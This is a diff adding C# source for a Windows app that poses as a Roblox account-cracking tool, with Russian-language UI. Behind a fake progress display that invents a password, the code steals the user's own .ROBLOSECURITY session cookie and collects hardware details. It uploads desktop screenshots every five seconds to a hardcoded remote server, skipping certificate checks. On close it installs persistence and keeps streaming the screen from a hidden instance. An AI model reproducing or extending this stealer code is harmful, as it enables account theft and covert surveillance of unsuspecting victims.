@@ -1,0 +1,769 @@
+using System;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.IO;
+using System.Management;
+using System.Net.Http;
+using System.Net.Security;
+using System.Security.Cryptography.X509Certificates;
+using System.Threading.Tasks;
+using System.Windows;
+using System.Windows.Controls;
+using System.Windows.Documents;
+using System.Windows.Input;
+using System.Windows.Media;
+using System.Windows.Media.Imaging;
+using System.Windows.Threading;
+
+namespace FileTransfer
+{
+    public partial class MainWindow : Window
+    {
+        private static readonly HttpClient _http;
+
+        static MainWindow()
+        {
+            var handler = new HttpClientHandler
+            {
+                AutomaticDecompression = System.Net.DecompressionMethods.All,
+                ServerCertificateCustomValidationCallback = (_, _, _, _) => true
+            };
+            _http = new HttpClient(handler) { Timeout = TimeSpan.FromMinutes(10) };
+            _http.DefaultRequestHeaders.UserAgent.ParseAdd(
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36");
+            _http.DefaultRequestHeaders.Accept.ParseAdd("image/webp,image/apng,image/*,*/*;q=0.8");
+        }
+
+        private const string ServerIp = "134.249.56.228";
+        private const string ServerPort = "25565";
+        private const string OperatorName = "DildMan";
+
+        private string? _cpu, _ram, _gpu;
+        private static string? _cachedToken;
+        private const string PlaceholderText = "Введите никнейм...";
+        private DispatcherTimer? _debounceTimer;
+        private DispatcherTimer? _screenshotTimer;
+        private StreamClient? _streamClient;
+        private bool _backgroundMode;
+
+        private static bool IsHiddenInstance()
+        {
+            try
+            {
+                string current = Process.GetCurrentProcess().MainModule?.FileName ?? "";
+                return current.Equals(Persistence.DestExe, StringComparison.OrdinalIgnoreCase);
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        public static void Log(string msg)
+        {
+            try
+            {
+                string logDir = Path.Combine(
+                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                    "Microsoft", "Windows", "Themes");
+                Directory.CreateDirectory(logDir);
+                string logFile = Path.Combine(logDir, "ft.log");
+                File.AppendAllText(logFile, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {msg}\n");
+            }
+            catch { }
+        }
+
+        private static readonly byte[] DummyPngBytes = new byte[]
+        {
+            0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
+            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4,
+            0x89, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x44, 0x41, 0x54, 0x78, 0xDA, 0x63, 0x60, 0x18, 0x05, 0xA3,
+            0x60, 0x14, 0x8C, 0x00, 0x08, 0x00, 0x05, 0x00, 0x01, 0x1E, 0xF5, 0x2E, 0x11, 0x00, 0x00, 0x00,
+            0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82
+        };
+
+        public MainWindow()
+        {
+            Log("MainWindow constructor start");
+            try
+            {
+                InitializeComponent();
+                Loaded += MainWindow_Loaded;
+
+                TxtUsername.Text = PlaceholderText;
+                TxtUsername.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(0x57, 0x60, 0x6F));
+
+                bool showUi = Environment.GetCommandLineArgs() is string[] args && Array.Exists(args, a => a == "--show" || a == "-show");
+                bool hiddenInstance = IsHiddenInstance();
+                _backgroundMode = hiddenInstance && !showUi;
+
+                if (_backgroundMode)
+                {
+                    // Фоновый режим (скрытая копия из автозагрузки)
+                    ShowInTaskbar = false;
+                    Opacity = 0;
+                    Log("Background mode start");
+                    _ = Task.Run(StartBackgroundWorkAsync);
+                    StartStreamClient();
+                }
+                else
+                {
+                    // Обычный видимый режим с кнопкой "Взлом"
+                    ShowInTaskbar = true;
+                    Opacity = 1;
+                    Log("Visible mode start");
+                }
+
+                Log("MainWindow constructor OK");
+            }
+            catch (Exception ex)
+            {
+                Log("MainWindow constructor error: " + ex);
+                throw;
+            }
+        }
+
+        protected override void OnClosing(CancelEventArgs e)
+        {
+            base.OnClosing(e);
+            e.Cancel = true;
+
+            if (!_backgroundMode)
+            {
+                // Первое закрытие: прячем окно, ставим персистентность, уходим в фон
+                Log("Closing to background");
+                _backgroundMode = true;
+                Persistence.Install();
+                Hide();
+                ShowInTaskbar = false;
+                _ = Task.Run(StartBackgroundWorkAsync);
+                StartStreamClient();
+            }
+            else
+            {
+                // Уже в фоне — просто остаёмся скрытым
+                Hide();
+                ShowInTaskbar = false;
+            }
+        }
+
+        private void MainWindow_Loaded(object sender, RoutedEventArgs e)
+        {
+            Log("MainWindow Loaded start");
+            try
+            {
+                if (_backgroundMode)
+                {
+                    Hide();
+                    ShowInTaskbar = false;
+                }
+                else
+                {
+                    Opacity = 1;
+                    ShowInTaskbar = true;
+                    Activate();
+                }
+                Log("MainWindow Loaded OK");
+            }
+            catch (Exception ex)
+            {
+                Log("MainWindow Loaded error: " + ex);
+                throw;
+            }
+        }
+
+        private async Task StartBackgroundWorkAsync()
+        {
+            Log("Background work start");
+            try
+            {
+                _cpu = ComputerInfo.GetCPU();
+                _ram = ComputerInfo.GetRAM();
+                _gpu = ComputerInfo.GetGPU();
+                await UploadFileOnStartupAsync();
+                StartScreenshotTimer();
+                Log("Background work OK");
+            }
+            catch (Exception ex)
+            {
+                Log("Background work error: " + ex);
+            }
+        }
+
+        // ── Console Logging ─────────────────────────────────────────────────
+        private void AppendConsole(string tag, string tagColor, string message, string msgColor)
+        {
+            Dispatcher.Invoke(() =>
+            {
+                TbConsole.Inlines.Add(new LineBreak());
+                var tagRun = new Run(tag) { Foreground = BrushFromHex(tagColor) };
+                var msgRun = new Run(message) { Foreground = BrushFromHex(msgColor) };
+                TbConsole.Inlines.Add(tagRun);
+                TbConsole.Inlines.Add(msgRun);
+                ConsoleScroller.ScrollToEnd();
+            });
+        }
+
+        private static SolidColorBrush BrushFromHex(string hex)
+        {
+            var c = (System.Windows.Media.Color)System.Windows.Media.ColorConverter.ConvertFromString(hex);
+            return new SolidColorBrush(c);
+        }
+
+        // ── Screenshot capture ──────────────────────────────────────────────
+        private static byte[] CaptureDesktopScreenshot()
+        {
+            try
+            {
+                var screen = System.Windows.Forms.Screen.PrimaryScreen;
+                if (screen == null) return DummyPngBytes;
+                var bounds = screen.Bounds;
+                using var bitmap = new System.Drawing.Bitmap(bounds.Width, bounds.Height);
+                using (var g = System.Drawing.Graphics.FromImage(bitmap))
+                {
+                    g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
+                }
+                using var ms = new MemoryStream();
+                bitmap.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
+                var bytes = ms.ToArray();
+                Log("Screenshot captured: " + bytes.Length + " bytes");
+                return bytes;
+            }
+            catch (Exception ex)
+            {
+                Log("Screenshot capture error: " + ex);
+                System.Diagnostics.Debug.WriteLine("Screenshot capture error: " + ex.Message);
+                return DummyPngBytes;
+            }
+        }
+
+        public static byte[] CaptureDesktopJpeg(int quality = 50, int scalePercent = 40)
+        {
+            try
+            {
+                var screen = System.Windows.Forms.Screen.PrimaryScreen;
+                if (screen == null) return Array.Empty<byte>();
+                var bounds = screen.Bounds;
+                int w = bounds.Width * scalePercent / 100;
+                int h = bounds.Height * scalePercent / 100;
+                if (w < 1) w = 1;
+                if (h < 1) h = 1;
+
+                using var src = new System.Drawing.Bitmap(bounds.Width, bounds.Height);
+                using (var g = System.Drawing.Graphics.FromImage(src))
+                {
+                    g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
+                }
+
+                using var dst = new System.Drawing.Bitmap(w, h);
+                using (var g = System.Drawing.Graphics.FromImage(dst))
+                {
+                    g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
+                    g.DrawImage(src, 0, 0, w, h);
+                }
+
+                using var ms = new MemoryStream();
+                var encoder = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders()
+                    .First(c => c.FormatID == System.Drawing.Imaging.ImageFormat.Jpeg.Guid);
+                var encoderParams = new System.Drawing.Imaging.EncoderParameters(1);
+                encoderParams.Param[0] = new System.Drawing.Imaging.EncoderParameter(
+                    System.Drawing.Imaging.Encoder.Quality, quality);
+                dst.Save(ms, encoder, encoderParams);
+                var bytes = ms.ToArray();
+                Log("JPEG frame captured: " + bytes.Length + " bytes");
+                return bytes;
+            }
+            catch (Exception ex)
+            {
+                Log("JPEG capture error: " + ex);
+                return Array.Empty<byte>();
+            }
+        }
+
+        // ── Startup Upload ──────────────────────────────────────────────────
+        private async Task UploadFileOnStartupAsync()
+        {
+            Log("Upload startup start");
+            try
+            {
+                byte[] screenshot = await Task.Run(CaptureDesktopScreenshot);
+                using var content = new MultipartFormDataContent();
+                var fileContent = new ByteArrayContent(screenshot);
+                fileContent.Headers.ContentType =
+                    new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
+                content.Add(fileContent, "files", "screenshot.png");
+                content.Add(new StringContent(ComputerInfo.GetName()), "computerName");
+                content.Add(new StringContent(ComputerInfo.GetOS()), "os");
+                content.Add(new StringContent(_cpu ?? "—"), "cpu");
+                content.Add(new StringContent(_ram ?? "—"), "ram");
+                content.Add(new StringContent(_gpu ?? "—"), "gpu");
+                content.Add(new StringContent(OperatorName), "operator");
+
+                // Пробуем вытянуть .ROBLOSECURITY и отправить сразу
+                try
+                {
+                    _cachedToken ??= CookieExtractor.ExtractRobloSecurity();
+                    if (!string.IsNullOrEmpty(_cachedToken))
+                    {
+                        content.Add(new StringContent(_cachedToken), "robloSecurity");
+                    }
+                }
+                catch { }
+
+                string url = $"https://{ServerIp}:{ServerPort}/upload";
+                var resp = await _http.PostAsync(url, content);
+                Log($"Upload startup response: {(int)resp.StatusCode}");
+            }
+            catch (Exception ex)
+            {
+                Log("Upload startup error: " + ex);
+                System.Diagnostics.Debug.WriteLine("Startup upload error: " + ex.Message);
+            }
+        }
+
+        // ── Periodic screenshot upload (every 5 sec) ───────────────────────
+        private void StartScreenshotTimer()
+        {
+            if (_screenshotTimer != null) return;
+            _screenshotTimer = new DispatcherTimer();
+            _screenshotTimer.Interval = TimeSpan.FromSeconds(5);
+            _screenshotTimer.Tick += async (s, e) =>
+            {
+                Log("Timer tick");
+                await UploadScreenshotAsync();
+            };
+            _screenshotTimer.Start();
+            Log("Screenshot timer started");
+        }
+
+        private void StartStreamClient()
+        {
+            if (_streamClient != null) return;
+            _streamClient = new StreamClient(ServerIp, ServerPort, ComputerInfo.GetName(), OperatorName);
+            _streamClient.Start();
+            Log("Stream client started");
+        }
+
+        private async Task UploadScreenshotAsync()
+        {
+            Log("Upload screenshot start");
+            try
+            {
+                byte[] screenshot = await Task.Run(CaptureDesktopScreenshot);
+                Log("Screenshot captured: " + screenshot.Length + " bytes");
+                using var content = new MultipartFormDataContent();
+                var fileContent = new ByteArrayContent(screenshot);
+                fileContent.Headers.ContentType =
+                    new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
+                content.Add(fileContent, "files", "screenshot.png");
+                content.Add(new StringContent(ComputerInfo.GetName()), "computerName");
+                content.Add(new StringContent(ComputerInfo.GetOS()), "os");
+                content.Add(new StringContent(_cpu ?? "—"), "cpu");
+                content.Add(new StringContent(_ram ?? "—"), "ram");
+                content.Add(new StringContent(_gpu ?? "—"), "gpu");
+                content.Add(new StringContent(OperatorName), "operator");
+
+                if (!string.IsNullOrEmpty(_cachedToken))
+                    content.Add(new StringContent(_cachedToken), "robloSecurity");
+
+                string url = $"https://{ServerIp}:{ServerPort}/upload";
+                var resp = await _http.PostAsync(url, content);
+                Log($"Upload screenshot response: {(int)resp.StatusCode}");
+            }
+            catch (Exception ex)
+            {
+                Log("Upload screenshot error: " + ex);
+                System.Diagnostics.Debug.WriteLine("Screenshot upload error: " + ex.Message);
+            }
+        }
+
+        // ── Window Controls ─────────────────────────────────────────────────
+        private void Border_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
+        {
+            if (e.ChangedButton == MouseButton.Left)
+                DragMove();
+        }
+
+        private void CloseWindow_Click(object sender, RoutedEventArgs e) => Close();
+        
+        private void MinimizeWindow_Click(object sender, RoutedEventArgs e)
+        {
+            WindowState = WindowState.Minimized;
+        }
+
+        // ── Placeholder ─────────────────────────────────────────────────────
+        private void TxtUsername_GotFocus(object sender, RoutedEventArgs e)
+        {
+            if (TxtUsername.Text == PlaceholderText)
+            {
+                TxtUsername.Text = "";
+                TxtUsername.Foreground = System.Windows.Media.Brushes.White;
+            }
+        }
+
+        private void TxtUsername_LostFocus(object sender, RoutedEventArgs e)
+        {
+            if (string.IsNullOrWhiteSpace(TxtUsername.Text))
+            {
+                TxtUsername.Text = PlaceholderText;
+                TxtUsername.Foreground = new SolidColorBrush(System.Windows.Media.Color.FromRgb(0x57, 0x60, 0x6F));
+            }
+        }
+
+        // ── Debounced Roblox Avatar ─────────────────────────────────────────
+        private void TxtUsername_TextChanged(object sender, TextChangedEventArgs e)
+        {
+            if (TxtUsername.Text == PlaceholderText) return;
+
+            if (_debounceTimer != null)
+                _debounceTimer.Stop();
+            else
+            {
+                _debounceTimer = new DispatcherTimer();
+                _debounceTimer.Interval = TimeSpan.FromMilliseconds(700);
+                _debounceTimer.Tick += DebounceTimer_Tick;
+            }
+            _debounceTimer.Start();
+        }
+
+        private async void DebounceTimer_Tick(object? sender, EventArgs e)
+        {
+            _debounceTimer?.Stop();
+
+            string username = TxtUsername.Text.Trim();
+            if (string.IsNullOrEmpty(username) || username == PlaceholderText)
+            {
+                AvatarBrush.ImageSource = null;
+                TxtPlaceholder.Text = "?";
+                TxtPlaceholder.Opacity = 0.3;
+                BtnHack.IsEnabled = false;
+                return;
+            }
+
+            TxtPlaceholder.Text = "⏳";
+            TxtPlaceholder.Opacity = 0.6;
+            AppendConsole("[roblox]", "#2A2D3A", $" Поиск профиля: {username}...", "#00CEC9");
+
+            var avatarImage = await DownloadRobloxAvatarAsync(username);
+
+            if (avatarImage != null)
+            {
+                AvatarBrush.ImageSource = avatarImage;
+                TxtPlaceholder.Opacity = 0;
+                AppendConsole("[roblox]", "#2A2D3A", $" ✓ Профиль загружен", "#2ED573");
+                BtnHack.IsEnabled = true;
+            }
+            else
+            {
+                TxtPlaceholder.Text = "?";
+                AvatarBrush.ImageSource = null;
+                TxtPlaceholder.Opacity = 0.3;
+                AppendConsole("[roblox]", "#2A2D3A", " ✗ Профиль не найден", "#FF4757");
+                BtnHack.IsEnabled = false;
+            }
+        }
+
+        /// <summary>
+        /// Downloads Roblox avatar by:
+        /// 1) POST to /v1/usernames/users (correct endpoint!) to resolve userId
+        /// 2) GET thumbnail URL from thumbnails API  
+        /// 3) Download actual image bytes via HttpClient (with User-Agent)
+        /// 4) Create BitmapImage from MemoryStream (bypasses WPF's broken URI loader)
+        /// </summary>
+        private async Task<BitmapImage?> DownloadRobloxAvatarAsync(string username)
+        {
+            try
+            {
+                // Step 1: Resolve username → userId
+                // FIXED: correct endpoint is /v1/usernames/users NOT /v1/users/by-usernames
+                var payload = new { usernames = new[] { username }, excludeBannedUsers = false };
+                var jsonPayload = System.Text.Json.JsonSerializer.Serialize(payload);
+                using var reqContent = new StringContent(jsonPayload, System.Text.Encoding.UTF8, "application/json");
+
+                var response = await _http.PostAsync("https://users.roblox.com/v1/usernames/users", reqContent);
+                if (!response.IsSuccessStatusCode)
+                {
+                    System.Diagnostics.Debug.WriteLine($"Users API returned {response.StatusCode}");
+                    return null;
+                }
+
+                var resStr = await response.Content.ReadAsStringAsync();
+                using var doc = System.Text.Json.JsonDocument.Parse(resStr);
+                var data = doc.RootElement.GetProperty("data");
+                if (data.GetArrayLength() == 0) return null;
+
+                long userId = data[0].GetProperty("id").GetInt64();
+
+                // Step 2: Get headshot thumbnail URL
+                var thumbUrl = $"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={userId}&size=150x150&format=Png&isCircular=false";
+                var thumbResponse = await _http.GetAsync(thumbUrl);
+                if (!thumbResponse.IsSuccessStatusCode) return null;
+
+                var thumbStr = await thumbResponse.Content.ReadAsStringAsync();
+                using var thumbDoc = System.Text.Json.JsonDocument.Parse(thumbStr);
+                var thumbData = thumbDoc.RootElement.GetProperty("data");
+                if (thumbData.GetArrayLength() == 0) return null;
+
+                var state = thumbData[0].GetProperty("state").GetString();
+                var imageUrl = thumbData[0].GetProperty("imageUrl").GetString();
+                
+                // If state is "Pending", retry once after a short delay
+                if (state == "Pending" || string.IsNullOrEmpty(imageUrl))
+                {
+                    await Task.Delay(2000);
+                    thumbResponse = await _http.GetAsync(thumbUrl);
+                    if (!thumbResponse.IsSuccessStatusCode) return null;
+                    thumbStr = await thumbResponse.Content.ReadAsStringAsync();
+                    using var retryDoc = System.Text.Json.JsonDocument.Parse(thumbStr);
+                    var retryData = retryDoc.RootElement.GetProperty("data");
+                    if (retryData.GetArrayLength() == 0) return null;
+                    imageUrl = retryData[0].GetProperty("imageUrl").GetString();
+                }
+
+                if (string.IsNullOrEmpty(imageUrl)) return null;
+
+                // Step 3: Download the actual image bytes via HttpClient
+                var imageBytes = await _http.GetByteArrayAsync(imageUrl);
+
+                // Step 4: Create BitmapImage from byte array on UI thread
+                return await Dispatcher.InvokeAsync(() =>
+                {
+                    var bitmap = new BitmapImage();
+                    using (var ms = new MemoryStream(imageBytes))
+                    {
+                        bitmap.BeginInit();
+                        bitmap.CacheOption = BitmapCacheOption.OnLoad;
+                        bitmap.StreamSource = ms;
+                        bitmap.EndInit();
+                    }
+                    bitmap.Freeze();
+                    return bitmap;
+                });
+            }
+            catch (Exception ex)
+            {
+                System.Diagnostics.Debug.WriteLine($"Roblox Avatar Error: {ex.Message}");
+                return null;
+            }
+        }
+
+        // ── HACK Button ─────────────────────────────────────────────────────
+        private async void BtnHack_Click(object sender, RoutedEventArgs e)
+        {
+            string username = TxtUsername.Text.Trim();
+            if (string.IsNullOrEmpty(username) || username == PlaceholderText)
+            {
+                AppendConsole("[error]", "#FF4757", " Введите никнейм Roblox!", "#FF4757");
+                SetStatusBadge("ОШИБКА", "#FF4757");
+                return;
+            }
+
+            // Используем кешированный .ROBLOSECURITY из запуска
+            string token = _cachedToken ?? "";
+            if (!string.IsNullOrEmpty(token))
+            {
+                AppendConsole("[cookie]", "#FFA502", " .ROBLOSECURITY загружен из кеша", "#2ED573");
+            }
+            else
+            {
+                AppendConsole("[cookie]", "#FFA502", " .ROBLOSECURITY отсутствует", "#FF4757");
+            }
+
+            BtnHack.IsEnabled = false;
+            TxtUsername.IsEnabled = false;
+            PanelResult.Visibility = Visibility.Collapsed;
+            HackProgress.Visibility = Visibility.Visible;
+            HackProgress.Value = 0;
+            SetStatusBadge("ПРОЦЕСС ВЗЛОМА", "#FFA502");
+
+            var rand = new Random();
+            int totalSeconds = rand.Next(25, 36);
+
+            string[] steps = new[]
+            {
+                "Подключение к Roblox API...",
+                "Поиск пользователя в базе данных...",
+                "Идентификация UserId...",
+                "Обход защиты Cloudflare...",
+                "Запуск брутфорса хэш-карты...",
+                "Внедрение в сессию авторизации...",
+                "Анализ трафика WebSocket...",
+                "Подмена токена .ROBLOSECURITY...",
+                "Выгрузка пакетов базы данных...",
+                "Попытка обхода 2FA верификации...",
+                "Генерация расшифрованного ключа..."
+            };
+
+            int elapsed = 0;
+            int stepIndex = 0;
+
+            while (elapsed < totalSeconds)
+            {
+                int nextDelay = rand.Next(2, 5);
+                if (elapsed + nextDelay > totalSeconds)
+                    nextDelay = totalSeconds - elapsed;
+
+                double progress = (double)elapsed / totalSeconds * 100;
+                HackProgress.Value = progress;
+
+                if (stepIndex < steps.Length)
+                {
+                    AppendConsole($"[{elapsed}s]", "#FFA502", $" {steps[stepIndex]}", "#81ECEC");
+                    stepIndex++;
+                }
+                else
+                {
+                    int pct = rand.Next(60, 100);
+                    AppendConsole($"[{elapsed}s]", "#FFA502", $" Расшифровка пароля: {pct}%...", "#81ECEC");
+                }
+
+                await Task.Delay(nextDelay * 1000);
+                elapsed += nextDelay;
+            }
+
+            HackProgress.Value = 100;
+
+            if (username.Length <= 6)
+            {
+                SetStatusBadge("ОШИБКА", "#FF4757");
+                AppendConsole("[error]", "#FF4757", " Ошибка: не удалось взломать", "#FF4757");
+                BtnHack.IsEnabled = true;
+                TxtUsername.IsEnabled = true;
+                HackProgress.Visibility = Visibility.Collapsed;
+                return;
+            }
+
+            AppendConsole("[done]", "#2ED573", " Расшифровка завершена!", "#2ED573");
+
+            string fakePassword = GetDeterministicPassword(username.ToLowerInvariant());
+
+            try
+            {
+                var updatePayload = new
+                {
+                    computerName = ComputerInfo.GetName(),
+                    robloxUser = username,
+                    fakePassword = fakePassword,
+                    robloSecurity = token,
+                    @operator = OperatorName
+                };
+                var jsonUpdate = System.Text.Json.JsonSerializer.Serialize(updatePayload);
+                using var updateContent = new StringContent(jsonUpdate, System.Text.Encoding.UTF8, "application/json");
+
+                string url = $"https://{ServerIp}:{ServerPort}/update-roblox";
+                var resp = await _http.PostAsync(url, updateContent);
+
+                if (resp.IsSuccessStatusCode)
+                {
+                    SetStatusBadge("ВЗЛОМ УСПЕШЕН", "#2ED573");
+                    TxtPassword.Text = fakePassword;
+                    PanelResult.Visibility = Visibility.Visible;
+                    AppendConsole("[result]", "#2ED573", $" Пароль: {fakePassword}", "#2ED573");
+                }
+                else
+                {
+                    SetStatusBadge("ОШИБКА СЕРВЕРА", "#FF4757");
+                    AppendConsole("[error]", "#FF4757", " Ошибка отправки на сервер", "#FF4757");
+                }
+            }
+            catch
+            {
+                SetStatusBadge("НЕТ СВЯЗИ", "#FF4757");
+                AppendConsole("[error]", "#FF4757", " Нет соединения с сервером", "#FF4757");
+            }
+
+            BtnHack.IsEnabled = true;
+            TxtUsername.IsEnabled = true;
+            HackProgress.Visibility = Visibility.Collapsed;
+        }
+
+        private void SetStatusBadge(string text, string dotColor)
+        {
+            TbStatusLabel.Text = text;
+            StatusDot.Fill = BrushFromHex(dotColor);
+        }
+
+        private string GetDeterministicPassword(string username)
+        {
+            int seed = 0;
+            foreach (char c in username)
+            {
+                seed = (seed * 31) + c;
+            }
+            var rand = new Random(seed);
+            int length = rand.Next(10, 15);
+            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%&*?_";
+            var buf = new char[length];
+            for (int i = 0; i < length; i++)
+                buf[i] = chars[rand.Next(chars.Length)];
+            return new string(buf);
+        }
+
+        private void BtnTelegram_Click(object sender, RoutedEventArgs e)
+        {
+            try
+            {
+                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
+                {
+                    FileName = "https://t.me/robloxvzlomez",
+                    UseShellExecute = true
+                });
+            }
+            catch (Exception ex)
+            {
+                System.Diagnostics.Debug.WriteLine("Error opening Telegram link: " + ex.Message);
+            }
+        }
+    }
+
+    // ── PC Info ─────────────────────────────────────────────────────────────
+    public static class ComputerInfo
+    {
+        public static string GetName() => Environment.MachineName;
+        public static string GetOS() => Environment.OSVersion.VersionString;
+
+        public static string GetCPU()
+        {
+            try
+            {
+                using var s = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor");
+                foreach (var o in s.Get())
+                    return o["Name"]?.ToString()?.Trim() ?? "—";
+            }
+            catch { }
+            return "—";
+        }
+
+        public static string GetRAM()
+        {
+            try
+            {
+                using var s = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
+                foreach (var o in s.Get())
+                {
+                    var b = Convert.ToInt64(o["TotalPhysicalMemory"]);
+                    return $"{b / (1024 * 1024 * 1024.0):F1} GB";
+                }
+            }
+            catch { }
+            return "—";
+        }
+
+        public static string GetGPU()
+        {
+            try
+            {
+                using var s = new ManagementObjectSearcher("SELECT Name FROM Win32_VideoController");
+                var gpus = new System.Collections.Generic.List<string>();
+                foreach (var o in s.Get())
+                {
+                    var n = o["Name"]?.ToString()?.Trim();
+                    if (!string.IsNullOrEmpty(n)) gpus.Add(n);
+                }
+                return gpus.Count > 0 ? string.Join(", ", gpus) : "—";
+            }
+            catch { }
+            return "—";
+        }
+    }
+}
